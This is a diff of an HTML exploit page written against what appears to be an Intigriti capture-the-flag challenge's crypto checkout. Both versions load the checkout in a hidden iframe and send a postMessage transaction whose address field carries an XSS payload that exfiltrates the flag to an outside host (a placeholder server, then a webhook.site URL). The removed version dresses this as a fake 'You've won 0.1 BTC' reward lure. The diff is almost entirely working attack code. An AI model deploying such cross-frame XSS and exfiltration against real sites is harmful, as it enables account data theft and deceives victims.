@@ -1,66 +1,37 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Free Crypto Bonus!</title>
-    <style>
-        body { 
-            font-family: Arial; 
-            text-align: center; 
-            padding: 50px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-        h1 { font-size: 48px; margin-bottom: 20px; }
-        p { font-size: 24px; }
-        .loading { 
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 30px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
-</head>
 <body>
-    <h1>🎁 Congratulations!</h1>
-    <p>You've won 0.1 BTC!</p>
-    <p>Processing your reward...</p>
-    <div class="loading"></div>
-    
-    <!-- Hidden iframe targeting victim's checkout page -->
-    <iframe 
-        id="target" 
-        src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=50000" 
-        style="display:none;"
-    ></iframe>
-
     <script>
-        // Wait for iframe to fully load
-        setTimeout(() => {
-            // Exploit payload - breaks out of onclick string context
-            const payload = "',fetch('https://YOUR-SERVER.com/?flag='+encodeURIComponent(document.getElementById('flagText').textContent)),'";
-            
-            // Send malicious transaction via postMessage
-            document.getElementById('target').contentWindow.postMessage({
+        // 1. Define the target URLs
+        const challengeDomain = "https://challenge-0126.intigriti.io";
+        const webhook = "https://webhook.site/f174d90f-ba4f-4ee9-b67b-bdefbadc2be4";
+
+        // 2. The XSS payload to steal the flag
+        // It escapes the title attribute and fetches /api/me
+        const xssPayload = `"><img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${webhook}?flag='+d.flag))">`;
+
+        // 3. Open the checkout page in an iframe
+        const iframe = document.createElement('iframe');
+        iframe.src = `${challengeDomain}/checkout.html?currency=BTC&price=1`;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+
+        iframe.onload = () => {
+            // 4. Trigger the transaction via postMessage
+            iframe.contentWindow.postMessage({
                 type: 'submitTransaction',
                 transaction: {
-                    toAddress: payload,
+                    toAddress: xssPayload,
                     currency: 'BTC',
-                    amount: 0.001
+                    amount: 0.0001
                 }
             }, '*');
-            
-            // Give feedback to victim
+
+            // 5. Redirect the bot to MarketWatch to trigger the Stored XSS
             setTimeout(() => {
-                document.body.innerHTML = '<h1>✓ Reward Claimed!</h1><p>Check your wallet in 24 hours.</p>';
-            }, 3000);
-        }, 3000);
+                window.location.href = `${challengeDomain}/marketwatch.html`;
+            }, 1500);
+        };
     </script>
 </body>
 </html>
